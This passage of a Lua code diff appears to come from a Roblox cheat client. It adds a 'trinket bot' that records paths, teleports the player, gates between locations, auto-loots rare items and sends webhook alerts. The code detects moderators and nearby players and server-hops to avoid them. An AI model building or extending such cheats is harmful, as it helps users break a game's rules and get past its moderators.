+                Tooltip = "Enter gate destination (e.g., 'Tundra 7', 'Desert 4')",
+                Placeholder = "e.g. Tundra 7"
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Add Gate",
+                Func = function()
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        library:Notify("Character not found!")
+                        return
+                    end
+
+                    local gate_location = Options.GateLocation and Options.GateLocation.Value or ""
+                    if gate_location == "" then
+                        library:Notify("Please enter a gate location!")
+                        return
+                    end
+
+                    local position = plr.Character.HumanoidRootPart.Position
+                    table.insert(trinket_bot.path_points, {
+                        position = position,
+                        wait_for_trinket = false,
+                        wait_time = 0,
+                        is_gate_point = true,
+                        gate_location = gate_location
+                    })
+
+                    library:Notify(string.format("Added gate point: %s (point #%d)", gate_location, #trinket_bot.path_points))
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Execute Gate (test)",
+                Func = function()
+                    local gate_location = Options.GateLocation and Options.GateLocation.Value or ""
+                    if gate_location == "" then
+                        library:Notify("Please enter a gate location!")
+                        return
+                    end
+
+                    library:Notify(string.format("Attempting to gate to %s...", gate_location))
+                    task.spawn(function()
+                        local success = Gate(gate_location)
+                        if success then
+                            library:Notify(string.format("Successfully gated to %s!", gate_location))
+                        else
+                            library:Notify(string.format("Failed to gate to %s", gate_location))
+                        end
+                    end)
+                end
+            })
+
+            group_trinket_bot:AddDivider()
+
+            group_trinket_bot:AddToggle("VisualizePoints", {
+                Text = "Visualize Points",
+                Default = false,
+                Callback = function(value)
+                    trinket_bot.visualize_enabled = value
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddDivider()
+
+            group_trinket_bot:AddToggle("SkipIllusionist", {
+                Text = "Skip Illusionist Servers",
+                Default = false
+            })
+
+            group_trinket_bot:AddDropdown("PickupMythicsArtifacts", {
+                Text = "Pick up Mythics/Artifacts",
+                Values = {
+                    "Rift Gem", "Mysterious Artifact", "Phoenix Flower", "Azael Horn",
+                    "Amulet of the White King", "Lannis Amulet", "Phoenix Down", "Night Stone", "Howler Friend"
+                },
+                Default = {
+                    "Rift Gem", "Mysterious Artifact", "Phoenix Flower", "Azael Horn",
+                    "Amulet of the White King", "Lannis Amulet", "Phoenix Down", "Night Stone", "Howler Friend"
+                },
+                Multi = true
+            })
+
+            group_trinket_bot:AddToggle("PickupScrolls", {
+                Text = "Pick up Scrolls",
+                Default = false
+            })
+
+            group_trinket_bot:AddToggle("PickupIceEssence", {
+                Text = "Pick up Ice Essence",
+                Default = false
+            })
+
+            group_trinket_bot:AddToggle("PickupEventItems", {
+                Text = "Pick up Event Items",
+                Default = false
+            })
+
+            group_trinket_bot:AddToggle("PickupTrinkets", {
+                Text = "Pick up Common Trinkets",
+                Default = false
+            })
+
+            group_trinket_bot:AddDivider()
+
+            group_trinket_bot:AddToggle("KickOnTrinket", {
+                Text = "Kick on Trinket Pickup",
+                Default = false,
+                Tooltip = "Kicks and webhooks when selected trinket is picked up"
+            })
+
+            group_trinket_bot:AddDropdown("KickTrinketList", {
+                Text = "Trinkets to Kick On",
+                Values = {
+                    "Rift Gem", "Mysterious Artifact", "Phoenix Flower", "Azael Horn",
+                    "Amulet of the White King", "Lannis's Amulet", "Phoenix Down", "Night Stone", "Howler Friend",
+                    "???", "Scroll", "Diamond", "Emerald", "Ruby", "Sapphire", "Ice Essence", "Bound Book",
+                    "Idol of the Forgotten", "Old Ring", "Ring", "Goblet", "Old Amulet", "Amulet", "Opal"
+                },
+                Multi = true,
+                Default = {},
+                Compact = true
+            })
+
+            group_trinket_bot:AddDivider()
+
+            group_trinket_bot:AddDropdown("EmergencyServerhopConditions", {
+                Text = "Emergency Serverhop Conditions",
+                Tooltip = "Select items that trigger instant serverhop when equipped by another player (no emergency gate)",
+                Values = {"Perflora", "Pebble"},
+                Multi = true,
+                Default = {"Perflora", "Pebble"},
+                Compact = true
+            })
+
+            group_trinket_bot:AddToggle("DisableGPURendering", {
+                Text = "Disable GPU Rendering",
+                Default = false,
+                Tooltip = "Disables 3D rendering when window loses focus to save CPU/GPU resources",
+                Callback = function(value)
+                    if value then
+                        if not cpu.status.active then
+                            cpu.status.active = true
+
+                            if shared.focusConnection then
+                                shared.focusConnection:Disconnect()
+                            end
+
+                            shared.focusConnection = utility:Connection(uis.WindowFocused, function()
+                                if not cpu.status.active then return end
+                                cpu.status.focused = true
+                                setfpscap(25)
+                                cpu.services.ugs.MasterVolume = cpu.services.ms
+                                settings().Rendering.QualityLevel = cpu.services.ql
+                                cpu.services.rs:Set3dRenderingEnabled(true)
+                            end)
+
+                            if shared.unfocusConnection then
+                                shared.unfocusConnection:Disconnect()
+                            end
+
+                            shared.unfocusConnection = utility:Connection(uis.WindowFocusReleased, function()
+                                if not cpu.status.active then return end
+                                cpu.status.focused = false
+                                setfpscap(25)
+                                settings().Rendering.QualityLevel = 1
+                                cpu.services.rs:Set3dRenderingEnabled(false)
+                            end)
+                        end
+                    else
+                        cpu.status.active = false
+                        setfpscap(240)
+                        settings().Rendering.QualityLevel = cpu.services.ql
+                        cpu.services.rs:Set3dRenderingEnabled(true)
+
+                        if shared.focusConnection then
+                            shared.focusConnection:Disconnect()
+                            shared.focusConnection = nil
+                        end
+
+                        if shared.unfocusConnection then
+                            shared.unfocusConnection:Disconnect()
+                            shared.unfocusConnection = nil
+                        end
+                    end
+                end
+            })
+
+            group_trinket_bot:AddToggle("JoinOldestServer", {
+                Text = "Join Oldest Server",
+                Default = false,
+                Tooltip = "Always join the oldest available server when serverhopping"
+            })
+
+            group_trinket_bot:AddToggle("AutoPopPDs", {
+                Text = "Auto Pop Phoenix Downs",
+                Default = false
+            })
+
+            group_trinket_bot:AddLabel("Auto Drop Items")
+            group_trinket_bot:AddDropdown("AutoDropItems", {
+                Text = "Auto Drop",
+                Values = {
+                    "Howler Friend",
+                    "Ice Essence",
+                    "Night Stone",
+                    "Lannis's Amulet",
+                    "Amulet of the White King",
+                    "Phoenix Down",
+                    "Scroll of Trahere",
+                    "Scroll of Telorum"
+                },
+                Multi = true,
+                Default = 1,
+                Tooltip = "Select items to automatically drop during botting"
+            })
+
+            group_trinket_bot:AddSlider("ProximityCheck", {
+                Text = "Proximity Check (studs)",
+                Default = 0,
+                Min = 0,
+                Max = 1000,
+                Rounding = 0,
+                Compact = true,
+                Tooltip = "If a player is within X studs, wait 5s then serverhop (0 = disabled)"
+            })
+
+            group_trinket_bot:AddSlider("CriticalDistance", {
+                Text = "Critical Distance (studs)",
+                Default = 60,
+                Min = 0,
+                Max = 1000,
+                Rounding = 0,
+                Compact = true,
+                Tooltip = "Bot will instantly serverhop if a player is within this range (bypasses all other checks, 0 = disabled)"
+            })
+
+            group_trinket_bot:AddSlider("MinPlayerCount", {
+                Text = "Min Player Count",
+                Default = 0,
+                Min = 0,
+                Max = 23,
+                Rounding = 0,
+                Compact = true
+            })
+
+            group_trinket_bot:AddSlider("TrinketBotSpeed", {
+                Text = "Speed",
+                Default = 100,
+                Min = 0,
+                Max = 300,
+                Rounding = 0
+            })
+
+            local group_trinket_config = Tabs.Botting:AddRightGroupbox("Trinket Bot Config")
+            local current_path_label
+            local function update_path_label(path_name)
+                trinket_bot.current_path_name = path_name or ""
+                if current_path_label and current_path_label.Text then
+                    if path_name and path_name ~= "" then
+                        current_path_label:SetText("Currently Editing: " .. path_name)
+                    else
+                        current_path_label:SetText("Currently Editing: None")
+                    end
+                end
+            end
+
+            local function get_saved_paths()
+                if not listfiles or not isfolder then
+                    return {}
+                end
+
+                local folder_path = "HYDROXIDE/trinket_paths"
+
+                if not isfolder(folder_path) then
+                    if makefolder then
+                        makefolder(folder_path)
+                    end
+                    return {}
+                end
+
+                local files = listfiles(folder_path)
+                local path_names = {}
+
+                for _, file_path in ipairs(files) do
+                    local file_name = file_path:match("([^/\\]+)%.json$")
+                    if file_name then
+                        table.insert(path_names, file_name)
+                    end
+                end
+
+                return path_names
+            end
+
+            local function apply_settings(settings)
+                if not settings then return end
+                if Toggles.SkipIllusionist then Toggles.SkipIllusionist:SetValue(settings.skip_illusionist or false) end
+                if Toggles.PickupScrolls then Toggles.PickupScrolls:SetValue(settings.pickup_scrolls or false) end
+                if Toggles.PickupIceEssence then Toggles.PickupIceEssence:SetValue(settings.pickup_ice_essence or false) end
+                if Options.PickupMythicsArtifacts then
+                    local val = settings.pickup_mythics_artifacts
+                    if type(val) == "boolean" or val == nil then
+                        val = val and {
+                            ["Rift Gem"] = true, ["Mysterious Artifact"] = true, ["Phoenix Flower"] = true, ["Azael Horn"] = true,
+                            ["Amulet of the White King"] = true, ["Lannis Amulet"] = true, ["Phoenix Down"] = true, ["Night Stone"] = true, ["Howler Friend"] = true
+                        } or {}
+                    end
+                    if settings.pickup_phoenix_down then
+                        val["Phoenix Down"] = true
+                        val["Phoenix Flower"] = true
+                    end
+                    if settings.pickup_azael_horn then
+                        val["Azael Horn"] = true
+                    end
+                    Options.PickupMythicsArtifacts:SetValue(val)
+                end
+                if Toggles.PickupEventItems then Toggles.PickupEventItems:SetValue(settings.pickup_event_items or false) end
+                if Toggles.PickupTrinkets then Toggles.PickupTrinkets:SetValue(settings.pickup_trinkets or false) end
+                if Toggles.DisableGPURendering then Toggles.DisableGPURendering:SetValue(settings.disable_gpu_rendering or false) end
+                if Options.EmergencyServerhopConditions then Options.EmergencyServerhopConditions:SetValue(settings.emergency_serverhop_conditions or {}) end
+                if Toggles.JoinOldestServer then Toggles.JoinOldestServer:SetValue(settings.join_oldest_server or false) end
+                if Toggles.MenuOnNon23 then Toggles.MenuOnNon23:SetValue(settings.menu_on_non_23 or false) end
+                if Toggles.AutoPopPDs then Toggles.AutoPopPDs:SetValue(settings.auto_pop_pds or false) end
+                if Options.AutoDropItems then Options.AutoDropItems:SetValue(settings.auto_drop_items or {}) end
+                if Toggles.KickOnTrinket then Toggles.KickOnTrinket:SetValue(settings.kick_on_trinket or false) end
+                if Options.KickTrinketList then Options.KickTrinketList:SetValue(settings.kick_trinket_list or {}) end
+                if Toggles.StayInServer then Toggles.StayInServer:SetValue(settings.stay_in_server or false) end
+                if Toggles.ReequipGateInLoop then Toggles.ReequipGateInLoop:SetValue(settings.reequip_gate_in_loop == nil and true or settings.reequip_gate_in_loop) end
+                if Options.TimeBetweenLooting then Options.TimeBetweenLooting:SetValue(settings.time_between_looting or 5) end
+                if Options.ProximityCheck then Options.ProximityCheck:SetValue(settings.proximity_check or 0) end
+                if Options.CriticalDistance then Options.CriticalDistance:SetValue(settings.critical_distance or 60) end
+                if Options.MinPlayerCount then Options.MinPlayerCount:SetValue(settings.min_player_count or 0) end
+                if Options.TrinketBotSpeed then Options.TrinketBotSpeed:SetValue(settings.speed or 100) end
+                if Toggles.show_in_artifact_stream then Toggles.show_in_artifact_stream:SetValue(settings.show_in_artifact_stream or false) end
+
+                if mem:HasItem("shared_settings") then
+                    local httpService = Services.HttpService
+                    local success, shared_settings = pcall(function()
+                        return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                    end)
+                    if success and shared_settings then
+                        if shared_settings.webhook then
+                            cheat_client.config.webhook = shared_settings.webhook
+                            if Options.webhook_url then
+                                Options.webhook_url:SetValue(shared_settings.webhook)
+                            end
+                        end
+                        if shared_settings.webhook_username then
+                            cheat_client.config.webhook_username = shared_settings.webhook_username
+                            if Options.webhook_username then
+                                Options.webhook_username:SetValue(shared_settings.webhook_username)
+                            end
+                        end
+                        if shared_settings.show_in_artifact_stream ~= nil then
+                            cheat_client.config.show_in_artifact_stream = shared_settings.show_in_artifact_stream
+                            if Toggles.show_in_artifact_stream then
+                                Toggles.show_in_artifact_stream:SetValue(shared_settings.show_in_artifact_stream)
+                            end
+                        end
+                    end
+                end
+            end
+
+            local function load_path_by_name(path_name)
+                if not path_name or path_name == "" then
+                    library:Notify("Please select a path!")
+                    return false
+                end
+
+                if not readfile or not isfile then
+                    library:Notify("readfile/isfile not supported!")
+                    return false
+                end
+
+                local file_path = "HYDROXIDE/trinket_paths/" .. path_name .. ".json"
+                if not isfile(file_path) then
+                    library:Notify(string.format("Path '%s' not found!", path_name))
+                    return false
+                end
+
+                local httpService = Services.HttpService
+                local success, save_data = pcall(function()
+                    local json = readfile(file_path)
+                    return httpService:JSONDecode(json)
+                end)
+
+                if success and save_data and save_data.points and #save_data.points > 0 then
+                    trinket_bot.path_points = {}
+                    for i, point_data in ipairs(save_data.points) do
+                        table.insert(trinket_bot.path_points, {
+                            position = Vector3.new(point_data.x, point_data.y, point_data.z),
+                            wait_for_trinket = point_data.wait_for_trinket or false,
+                            wait_time = point_data.wait_time or 0,
+                            is_gate_point = point_data.is_gate_point or false,
+                            gate_location = point_data.gate_location
+                        })
+                    end
+
+                    apply_settings(save_data.settings)
+
+                    library:Notify(string.format("Loaded path '%s' with %d points", path_name, #trinket_bot.path_points))
+                    update_path_label(path_name)
+
+                    if Options.PathName then
+                        Options.PathName:SetValue(path_name)
+                    end
+
+                    if Toggles.VisualizePoints and Toggles.VisualizePoints.Value then
+                        trinket_bot.visualize_enabled = true
+                        update_visualizations()
+                    end
+                    return true
+                else
+                    library:Notify("Failed to load path!")
+                    trinket_bot.path_points = {}
+                    return false
+                end
+            end
+
+            task.spawn(function()
+                if mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                    task.wait(2)
+
+                    trinket_bot.path_running = false
+
+                    local should_skip_illusionist = false
+                    if mem:HasItem("trinket_bot_settings") then
+                        local httpService = Services.HttpService
+                        local success_load, loaded_settings = pcall(function()
+                            return httpService:JSONDecode(mem:GetItem("trinket_bot_settings"))
+                        end)
+                        if success_load and loaded_settings then
+                            should_skip_illusionist = loaded_settings.skip_illusionist or false
+                        end
+                    end
+
+                    for _, other_player in next, plrs:GetPlayers() do
+                        if other_player ~= plr and is_moderator(other_player) then
+                            library:Notify("Moderator in server! Serverhopping...")
+                            task.wait(0.5)
+                            TrinketBotServerhop(string.format("MODERATOR IN SERVER; %s - Serverhopping before spawn", other_player.Name))
+                            return
+                        end
+                    end
+
+                    if should_skip_illusionist then
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and has_observe(other_player) then
+                                library:Notify("Illusionist in server! Serverhopping...")
+                                task.wait(0.5)
+                                TrinketBotServerhop(string.format("ILLUSIONIST IN SERVER; %s - Serverhopping before spawn", other_player.Name))
+                                return
+                            end
+                        end
+                    end
+
+                    local success = pcall(function()
+                        plr.PlayerGui:WaitForChild("StartMenu", 30)
+                    end)
+
+                    if success and plr.PlayerGui:FindFirstChild("StartMenu") then
+                        task.wait(1)
+
+                        pcall(function()
+                            if plr.PlayerGui.StartMenu:FindFirstChild("Choices") and
+                               plr.PlayerGui.StartMenu.Choices:FindFirstChild("Play") then
+                                firesignal(plr.PlayerGui.StartMenu.Choices.Play.MouseButton1Click)
+                            end
+                        end)
+
+                        repeat task.wait(0.25) until plr.Character
+                        repeat task.wait(0.25) until plr.Character:FindFirstChild("HumanoidRootPart")
+                        task.wait(1)
+
+                        local auto_start_death_connection
+                        local character = plr.Character
+                        if character then
+                            local humanoid = character:FindFirstChildOfClass("Humanoid")
+                            if humanoid then
+                                auto_start_death_connection = utility:Connection(humanoid.Died, function()
+                                    if auto_start_death_connection then
+                                        pcall(function() auto_start_death_connection:Disconnect() end)
+                                        auto_start_death_connection = nil
+                                    end
+
+                                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                                    if stay_in_server then
+                                        pcall(function() library:Notify("Died during auto-start (stay in server mode)") end)
+                                        pcall(function() utility:plain_webhook("@here Bot died during auto-start (stay in server mode)") end)
+                                    else
+                                        pcall(function() library:Notify("Died during auto-start - kicking") end)
+                                        pcall(function() utility:plain_webhook("@everyone Bot died during auto-start - kicking") end)
+                                        task.wait(0.3)
+                                        plr:Kick("Bot died during auto-start")
+                                    end
+                                end)
+                            else
+                                utility:plain_webhook("@everyone CRITICAL: Humanoid not found during auto-start - kicking for safety")
+                                library:Notify("CRITICAL: Humanoid not found - kicking")
+                                task.wait(0.5)
+                                plr:Kick("Humanoid not found during auto-start")
+                                return
+                            end
+                        else
+                            utility:plain_webhook("@everyone CRITICAL: Character lost during auto-start - kicking for safety")
+                            library:Notify("CRITICAL: Character lost - kicking")
+                            task.wait(0.5)
+                            plr:Kick("Character lost during auto-start")
+                            return
+                        end
+
+                        local saved_path = mem:GetItem("trinket_bot_path")
+                        if not saved_path or saved_path == "" then
+                            if auto_start_death_connection then
+                                pcall(function() auto_start_death_connection:Disconnect() end)
+                                auto_start_death_connection = nil
+                            end
+                            utility:plain_webhook("@everyone CRITICAL: No saved path found during auto-start (trinket_bot_path empty) - kicking for safety")
+                            library:Notify("CRITICAL: No saved path found - kicking")
+                            mem:RemoveItem("botstarted")
+                            task.wait(0.5)
+                            plr:Kick("No saved path found during auto-start")
+                            return
+                        end
+
+                        local load_success = load_path_by_name(saved_path)
+                        task.wait(1)
+
+                        if not load_success or #trinket_bot.path_points == 0 then
+                            if auto_start_death_connection then
+                                pcall(function() auto_start_death_connection:Disconnect() end)
+                                auto_start_death_connection = nil
+                            end
+                            utility:plain_webhook(string.format("FAILED TO LOAD PATH: %s (load_success=%s, points=%d) - Kicking", saved_path, tostring(load_success), #trinket_bot.path_points))
+                            library:Notify("Path failed to load! Kicking...")
+                            mem:RemoveItem("botstarted")
+                            task.wait(1)
+                            plr:Kick(string.format("Path failed to load: %s", saved_path))
+                            return
+                        end
+
+                        if mem:HasItem("trinket_bot_settings") then
+                            local httpService = Services.HttpService
+                            local success, settings = pcall(function()
+                                return httpService:JSONDecode(mem:GetItem("trinket_bot_settings"))
+                            end)
+
+                            if success then
+                                apply_settings(settings)
+                            end
+                        end
+
+                        local saved_position = nil
+                        if mem:HasItem("lastPlayerPosition") then
+                            local pos_str = mem:GetItem("lastPlayerPosition")
+                            local coords = string.split(pos_str, ",")
+                            if #coords == 3 then
+                                saved_position = Vector3.new(tonumber(coords[1]), tonumber(coords[2]), tonumber(coords[3]))
+                                library:Notify(string.format("Retrieved saved position: %.1f, %.1f, %.1f", saved_position.X, saved_position.Y, saved_position.Z))
+                            end
+                        end
+
+                        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                            local root = plr.Character.HumanoidRootPart
+                            local first_point = trinket_bot.path_points[1] and trinket_bot.path_points[1].position
+
+                            if first_point and typeof(first_point) == "Vector3" then
+                                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                                if not stay_in_server then
+                                    local distance_to_first = (root.Position - first_point).Magnitude
+
+                                    if distance_to_first >= 20 then
+                                        local reference_position = saved_position or root.Position
+                                        local closest_point_index = 1
+                                        local closest_distance = (reference_position - first_point).Magnitude
+
+                                        for idx, path_point in ipairs(trinket_bot.path_points) do
+                                            local dist = (reference_position - path_point.position).Magnitude
+                                            if dist < closest_distance then
+                                                closest_distance = dist
+                                                closest_point_index = idx
+                                            end
+                                        end
+
+                                        if closest_distance < 2000 then
+                                            if closest_point_index > 1 then
+                                                local path_has_gates = false
+                                                for _, check_point in ipairs(trinket_bot.path_points) do
+                                                    if check_point.is_gate_point then
+                                                        path_has_gates = true
+                                                        break
+                                                    end
+                                                end
+
+                                                if path_has_gates and saved_position then
+                                                    library:Notify(string.format("Resuming after serverhop - continuing from saved position (closest point %d)", closest_point_index))
+                                                    task.wait(1)
+
+                                                    local proximity_check_distance = Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                                                    if proximity_check_distance > 0 and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                                                        local char_pos = plr.Character.HumanoidRootPart.Position
+
+                                                        for _, other_player in next, plrs:GetPlayers() do
+                                                            if other_player ~= plr and other_player.Character and other_player.Character:FindFirstChild("HumanoidRootPart") then
+                                                                local distance = (other_player.Character.HumanoidRootPart.Position - char_pos).Magnitude
+
+                                                                if distance <= proximity_check_distance then
+                                                                    library:Notify(string.format("Player %s within %d studs after resume - serverhopping", other_player.Name, math.floor(distance)))
+                                                                    SafeServerhop(string.format("Player %s within %d studs after resume", other_player.Name, math.floor(proximity_check_distance)))
+                                                                    return
+                                                                end
+                                                            end
+                                                        end
+                                                    end
+
+                                                    local character = plr.Character
+                                                    local forcefield_removed = false
+                                                    local teleport_platform = nil
+
+                                                    if character and FindFirstChild(character, "HumanoidRootPart") then
+                                                        teleport_platform = Instance.new("Part")
+                                                        teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                        teleport_platform.Position = saved_position + Vector3.new(0, -3, -18)
+                                                        teleport_platform.Anchored = true
+                                                        teleport_platform.CanCollide = true
+                                                        teleport_platform.Transparency = 1
+                                                        teleport_platform.Parent = workspace
+
+                                                        trinket_bot.path_running = true
+                                                        SmoothTeleport(teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                        task.wait(1.5)
+
+                                                        if character and not FindFirstChildOfClass(character, "ForceField") then
+                                                            forcefield_removed = true
+                                                            library:Notify("ForceField removed via SmoothTeleport at saved position")
+                                                        end
+
+                                                        if teleport_platform then
+                                                            teleport_platform:Destroy()
+                                                            teleport_platform = nil
+                                                        end
+                                                    end
+
+                                                    if forcefield_removed then
+                                                        library:Notify(string.format("Continuing path from point %d", closest_point_index))
+
+                                                        local original_path = trinket_bot.path_points
+                                                        local original_point_1_pos = original_path[1].position
+                                                        local temp_path = {}
+
+                                                        for i = closest_point_index, #original_path do
+                                                            table.insert(temp_path, original_path[i])
+                                                        end
+
+                                                        for i = 1, closest_point_index - 1 do
+                                                            table.insert(temp_path, original_path[i])
+                                                        end
+
+                                                        trinket_bot.path_points = temp_path
+                                                        trinket_bot.original_point_1_position = original_point_1_pos
+
+                                                        trinket_bot.skip_distance_check = true
+
+                                                        trinket_bot.path_running = false
+
+                                                        library:Notify(string.format("Resuming path with %d points (starting from point %d)", #temp_path, closest_point_index))
+                                                        task.wait(0.5)
+
+                                                        if auto_start_death_connection then
+                                                            pcall(function() auto_start_death_connection:Disconnect() end)
+                                                            auto_start_death_connection = nil
+                                                        end
+
+                                                        ExecutePath(false)
+                                                        return
+                                                    else
+                                                        library:Notify("Could not remove ForceField at saved position - serverhopping")
+                                                        trinket_bot.path_running = false
+                                                        TrinketBotServerhop("Failed to remove ForceField for resume at saved position")
+                                                        return
+                                                    end
+                                                elseif path_has_gates then
+                                                    local last_gate_point = nil
+                                                    local last_gate_index = nil
+                                                    for i = #trinket_bot.path_points, 1, -1 do
+                                                        if trinket_bot.path_points[i].is_gate_point then
+                                                            last_gate_point = trinket_bot.path_points[i]
+                                                            last_gate_index = i
+                                                            break
+                                                        end
+                                                    end
+
+                                                    if last_gate_point then
+                                                        library:Notify(string.format("Resuming after serverhop (no saved position) - gating to last gate point %d", last_gate_index))
+                                                        task.wait(1)
+
+                                                        local proximity_check_distance = Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                                                        if proximity_check_distance > 0 and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                                                            local char_pos = plr.Character.HumanoidRootPart.Position
+
+                                                            for _, other_player in next, plrs:GetPlayers() do
+                                                                if other_player ~= plr and other_player.Character and other_player.Character:FindFirstChild("HumanoidRootPart") then
+                                                                    local distance = (other_player.Character.HumanoidRootPart.Position - char_pos).Magnitude
+
+                                                                    if distance <= proximity_check_distance then
+                                                                        library:Notify(string.format("Player %s within %d studs after resume - serverhopping", other_player.Name, math.floor(distance)))
+                                                                        SafeServerhop(string.format("Player %s within %d studs after resume", other_player.Name, math.floor(proximity_check_distance)))
+                                                                        return
+                                                                    end
+                                                                end
+                                                            end
+                                                        end
+
+                                                        local character = plr.Character
+                                                        local forcefield_removed = false
+                                                        local teleport_platform = nil
+
+                                                        if character and FindFirstChild(character, "HumanoidRootPart") then
+                                                            local hrp = character.HumanoidRootPart
+                                                            local start_pos = hrp.Position
+
+                                                            teleport_platform = Instance.new("Part")
+                                                            teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                            teleport_platform.Position = start_pos + Vector3.new(0, -3, 18)
+                                                            teleport_platform.Anchored = true
+                                                            teleport_platform.CanCollide = true
+                                                            teleport_platform.Transparency = 1
+                                                            teleport_platform.Parent = workspace
+
+                                                            trinket_bot.path_running = true
+                                                            SmoothTeleport(teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                            task.wait(1.5)
+
+                                                            if character and not FindFirstChildOfClass(character, "ForceField") then
+                                                                forcefield_removed = true
+                                                                library:Notify("ForceField removed via SmoothTeleport")
+                                                            end
+
+                                                            if teleport_platform then
+                                                                teleport_platform:Destroy()
+                                                                teleport_platform = nil
+                                                            end
+                                                        end
+
+                                                        if forcefield_removed then
+                                                            library:Notify("ForceField removed - gating to last gate point")
+
+                                                            local gate_success = Gate(last_gate_point.gate_location)
+
+                                                            if gate_success then
+                                                                library:Notify(string.format("Successfully gated to last gate point %d - continuing to end then serverhopping", last_gate_index))
+
+                                                                local original_path = trinket_bot.path_points
+                                                                local temp_path = {}
+
+                                                                for i = last_gate_index + 1, #original_path do
+                                                                    table.insert(temp_path, original_path[i])
+                                                                end
+
+                                                                trinket_bot.path_points = temp_path
+
+                                                                if #temp_path == 0 then
+                                                                    library:Notify("Last gate point was final destination - serverhopping")
+                                                                    trinket_bot.path_running = false
+                                                                    TrinketBotServerhop("Completed path after resume gate")
+                                                                    return
+                                                                end
+
+                                                                first_point = temp_path[1] and temp_path[1].position
+
+                                                                trinket_bot.skip_distance_check = true
+
+                                                                trinket_bot.path_running = false
+
+                                                                library:Notify(string.format("Resuming path with %d remaining points", #temp_path))
+                                                                task.wait(0.5)
+
+                                                                if auto_start_death_connection then
+                                                                    pcall(function() auto_start_death_connection:Disconnect() end)
+                                                                    auto_start_death_connection = nil
+                                                                end
+
+                                                                ExecutePath(false)
+                                                                return
+                                                            else
+                                                                library:Notify("Resume gate to last point failed - serverhopping")
+                                                                trinket_bot.path_running = false
+                                                                TrinketBotServerhop("Resume gate failed after ForceField removal")
+                                                                return
+                                                            end
+                                                        else
+                                                            library:Notify("Could not remove ForceField - serverhopping")
+                                                            trinket_bot.path_running = false
+                                                            TrinketBotServerhop("Failed to remove ForceField for resume gate")
+                                                            return
+                                                        end
+                                                    else
+                                                        library:Notify("No gate points found in path - serverhopping")
+                                                        TrinketBotServerhop("No gate points in path for resume")
+                                                        return
+                                                    end
+                                                else
+                                                    library:Notify(string.format("Starting from point %d (%.0f studs away), following path to point 1", closest_point_index, closest_distance))
+
+                                                    local original_path = trinket_bot.path_points
+                                                    local original_point_1_pos = original_path[1].position
+                                                    local temp_path = {}
+
+                                                    for i = closest_point_index, #original_path do
+                                                        table.insert(temp_path, original_path[i])
+                                                    end
+
+                                                    for i = 1, closest_point_index - 1 do
+                                                        table.insert(temp_path, original_path[i])
+                                                    end
+
+                                                    trinket_bot.path_points = temp_path
+                                                    trinket_bot.original_point_1_position = original_point_1_pos
+                                                end
+                                            end
+                                        else
+                                            library:Notify(string.format("Too far from path (%.1f studs) - attempting recovery", closest_distance))
+
+                                            if saved_position then
+                                                local saved_closest_idx = 1
+                                                local saved_closest_dist = (saved_position - trinket_bot.path_points[1].position).Magnitude
+                                                for idx, path_point in ipairs(trinket_bot.path_points) do
+                                                    local dist = (saved_position - path_point.position).Magnitude
+                                                    if dist < saved_closest_dist then
+                                                        saved_closest_dist = dist
+                                                        saved_closest_idx = idx
+                                                    end
+                                                end
+
+                                                library:Notify(string.format("Far recovery with saved position - closest point %d is %.1f studs from saved pos", saved_closest_idx, saved_closest_dist))
+                                                task.wait(1)
+
+                                                local prox_check_dist = Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                                                if prox_check_dist > 0 and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                                                    local char_pos = plr.Character.HumanoidRootPart.Position
+                                                    for _, other_player in next, plrs:GetPlayers() do
+                                                        if other_player ~= plr and other_player.Character and other_player.Character:FindFirstChild("HumanoidRootPart") then
+                                                            local dist = (other_player.Character.HumanoidRootPart.Position - char_pos).Magnitude
+                                                            if dist <= prox_check_dist then
+                                                                library:Notify(string.format("Player %s within %d studs during far recovery - serverhopping", other_player.Name, math.floor(dist)))
+                                                                SafeServerhop(string.format("Player %s within %d studs during far path recovery", other_player.Name, math.floor(prox_check_dist)))
+                                                                return
+                                                            end
+                                                        end
+                                                    end
+                                                end
+
+                                                local recovery_character = plr.Character
+                                                local recovery_ff_removed = false
+                                                local recovery_teleport_platform = nil
+
+                                                if recovery_character and FindFirstChild(recovery_character, "HumanoidRootPart") then
+                                                    recovery_teleport_platform = Instance.new("Part")
+                                                    recovery_teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                    recovery_teleport_platform.Position = saved_position + Vector3.new(0, -3, -18)
+                                                    recovery_teleport_platform.Anchored = true
+                                                    recovery_teleport_platform.CanCollide = true
+                                                    recovery_teleport_platform.Transparency = 1
+                                                    recovery_teleport_platform.Parent = workspace
+
+                                                    trinket_bot.path_running = true
+                                                    SmoothTeleport(recovery_teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                    task.wait(1.5)
+
+                                                    if recovery_character and not FindFirstChildOfClass(recovery_character, "ForceField") then
+                                                        recovery_ff_removed = true
+                                                        library:Notify("ForceField removed at saved position for far recovery")
+                                                    end
+
+                                                    if recovery_teleport_platform then
+                                                        recovery_teleport_platform:Destroy()
+                                                        recovery_teleport_platform = nil
+                                                    end
+                                                end
+
+                                                if recovery_ff_removed then
+                                                    library:Notify(string.format("Continuing path from point %d after far recovery", saved_closest_idx))
+
+                                                    local recovery_original_path = trinket_bot.path_points
+                                                    local recovery_original_point_1_pos = recovery_original_path[1].position
+                                                    local recovery_temp_path = {}
+
+                                                    for i = saved_closest_idx, #recovery_original_path do
+                                                        table.insert(recovery_temp_path, recovery_original_path[i])
+                                                    end
